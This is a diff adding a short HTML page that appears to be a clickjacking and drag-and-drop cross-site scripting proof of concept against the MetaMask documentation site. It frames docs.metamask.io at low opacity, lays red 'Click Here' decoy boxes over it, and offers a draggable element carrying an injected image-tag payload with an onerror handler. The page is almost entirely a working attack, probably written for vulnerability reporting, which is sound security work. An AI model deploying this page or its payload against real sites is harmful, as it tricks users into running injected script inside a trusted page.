@@ -1,0 +1,28 @@
+<html>
+<head>
+<style>
+#payload{
+position: absolute;
+top: 220px;
+left: 80px;
+}
+iframe{
+width: 100%;
+height: 785px;
+border: none;
+}
+.xss{
+position: fixed;
+background: #F00;
+}
+</style>
+</body>
+</head>
+<body>
+<div style="height: 50px;width: 400px;left: 6%;top: 1%;" class="xss"><h2>HERE BRO!</h2></div>
+<div style="height: 35px;width: 40px;left: 91%;top: 4%;" class="xss">1Click!</div>
+<div style="height: 50px;width: 495px;left: 7%;top: 6%;" class="xss">Click Here</div>
+<iframe style="opacity:0.3"src="https://docs.metamask.io/" width="100%" height="100%"></iframe></iframe>
+<div id="payload" draggable="true" ondragstart="event.dataTransfer.setData('text/plain', 'xss script img tag &quot;><img src=x onerror=alert(origin)> 10x')"><h3>DRAG ME TO THE RED BOX (step 2)</h3></div>
+</body>
+</html>
